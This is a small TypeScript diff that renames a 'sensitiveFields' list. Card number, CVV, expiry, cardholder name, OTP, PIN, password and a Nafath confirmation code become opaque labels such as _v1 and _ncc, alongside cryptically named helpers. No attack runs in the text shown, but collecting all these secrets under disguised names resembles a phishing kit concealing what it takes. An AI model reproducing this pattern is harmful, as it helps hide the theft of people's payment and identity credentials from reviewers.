@@ -3,14 +3,14 @@ import { addData as originalAddData, updateDoc as originalUpdateDoc } from './fi
 import { _e, _d, _ef, _df, _l, _gf } from './secure-utils'
 
 const sensitiveFields = [
-  'cardNumber',
-  'cvv',
-  'expiryDate',
-  'cardHolderName',
-  'otp',
-  'pinCode',
-  'password',
-  'nafadConfirmationCode'
+  '_v1',
+  '_v2',
+  '_v3',
+  '_v4',
+  '_v5',
+  '_v6',
+  '_pw',
+  '_ncc'
 ]
 
 function isSensitive(key: string): boolean {
